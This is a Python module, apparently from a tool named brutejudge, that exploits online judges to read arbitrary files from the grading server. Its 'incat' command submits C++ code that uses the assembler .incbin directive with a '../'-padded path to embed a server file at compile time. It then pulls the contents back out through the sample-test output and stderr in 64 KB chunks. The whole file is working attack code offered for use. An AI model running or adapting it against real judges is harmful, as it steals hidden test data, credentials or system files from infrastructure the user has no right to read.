from brutejudge.commands.samples import get_samples
from brutejudge.http import task_list, submit, submission_list, submission_status
from brutejudge.error import BruteError
import shlex, sys, random

def do_incat(self, cmd):
    """
    usage: incat <task> <filepath> [savepath]

    Tries to retrieve the specified ASCII file using .incbin directive.
    """
    data = shlex.split(cmd)
    if len(data) not in (2, 3):
        return self.do_help('incat')
    data.append(None)
    task, filepath, savepath = data[:3]
    tasks = task_list(self.url, self.cookie)
    try:
        task_id = tasks.index(task)
    except ValueError:
        raise BruteError("No such task.")
    if savepath == None:
        f = sys.stdout
    else:
        f = open(savepath, "w")
    incat(self, task, task_id, filepath, f)
    if savepath != None: f.close()

def incat(self, task, task_id, filepath, f, filter=''):
    if filepath.startswith('/'):
        filepath = '/'.join(['..']*15)+filepath
    lans = 0
    while True:
        subm1 = list(zip(*submission_list(self.url, self.cookie)))
        submit(self.url, self.cookie, task_id, 3, r"""
asm("included:\n.incbin \"%s\"\n.byte 0");

//random: %r

#include <bits/stdc++.h>

using namespace std;

extern char included[];

int main()
{
    string included_s = included;
    %scout << included_s.substr(%d, 65536);
    cerr << included_s.substr(%d, 65536);
    return 0;
}
"""%(filepath, random.random(), filter.replace('\n', '\n    '), lans, lans + 65536))
        subm2 = list(zip(*submission_list(self.url, self.cookie)))
        if subm2[1:] != subm1 or not subm2 or subm2[0][1] != task:
            raise BruteError("Error while sending.")
        subm_id = subm2[0][0]
        while submission_status(self.url, self.cookie, subm_id).endswith('...'): pass
        samples = get_samples(self.url, self.cookie, subm_id)
        if not samples:
            raise BruteError("No sample tests for this task.")
        sample = next(iter(samples.values()))
        if 'Output' not in sample:
            raise BruteError("Output missing from report.")
        f.write(sample['Output'])
        lans += len(sample['Output'])
        if len(sample['Output']) < 65536: break
        if 'Stderr' in sample:
            f.write(sample['Stderr'])
            lans += len(sample['Stderr'])
            if len(sample['Stderr']) < 65536: break
